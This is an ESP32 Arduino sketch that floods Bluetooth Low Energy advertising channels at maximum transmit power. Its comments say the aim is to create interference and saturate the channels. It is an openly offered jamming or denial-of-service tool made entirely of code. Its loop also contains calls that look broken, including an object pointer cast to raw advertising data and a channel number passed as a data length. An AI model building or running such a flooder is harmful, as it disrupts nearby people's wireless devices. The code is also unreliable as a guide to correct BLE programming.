#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEAdvertising.h>
#include <esp_bt.h>

BLEAdvertising *pAdvertising;

void setup() {
  Serial.begin(115200);
  Serial.println("Starting Enhanced BLE Advertising Flood");

  // Initialize BLE
  BLEDevice::init("ESP32_Interference");

  // Set the maximum transmission power
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);  // Max power level

  // Configure advertising parameters
  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND); // Non-connectable advertising
  pAdvertising->setMinInterval(0x20);  // Minimum advertising interval (20ms)
  pAdvertising->setMaxInterval(0x20);  // Maximum advertising interval (20ms)

  // Advertisement data
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  oAdvertisementData.setFlags(0x06); // General Discoverable, BR/EDR Not Supported

  // Custom payload to increase traffic
  std::string customPayload = "ESP32_Flooding_Payload";
  oAdvertisementData.addData(customPayload);

  pAdvertising->setAdvertisementData(oAdvertisementData);

  // Start advertising
  pAdvertising->start();
}

void loop() {
  // Continuously advertise to create interference
  delay(10); // Short delay to continuously flood the channels

  // Dynamically change advertising channels to ensure saturation
  static int channel = 37;
  esp_ble_gap_config_adv_data_raw((uint8_t *)pAdvertising, channel);
  channel++;
  if (channel > 39) {
    channel = 37;
  }
}
